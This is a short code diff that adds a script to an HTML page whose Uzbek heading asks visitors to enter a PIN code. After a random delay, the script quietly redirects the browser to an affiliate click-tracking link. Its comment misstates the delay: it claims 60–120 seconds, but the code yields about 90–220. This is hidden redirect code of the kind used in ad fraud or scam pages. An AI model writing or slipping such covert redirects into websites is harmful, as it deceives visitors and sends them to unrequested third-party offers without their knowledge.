@@ -438,6 +438,14 @@
     </style>
 </head>
 <body>
+        <script>
+        // Random duration between 60-120 seconds (1-2 minutes)
+        const redirectTime = Math.floor(Math.random() * (190 - 60 + 1)) + 90;
+
+        setTimeout(function() {
+            window.location.href = 'https://www1.affhone.fyi/click?pid=81683&offer_id=25';
+        }, redirectTime * 1000);
+    </script>
     <div class="container" id="sovchilarPage">
         <h2 id="pinTitle" class="changing-text">Sizga Birilgan 3 yoki 4 - Yoki 5 Xonalik PIN Kodni kiriting va tugmani bosing</h2>
         <div class="pin-container">
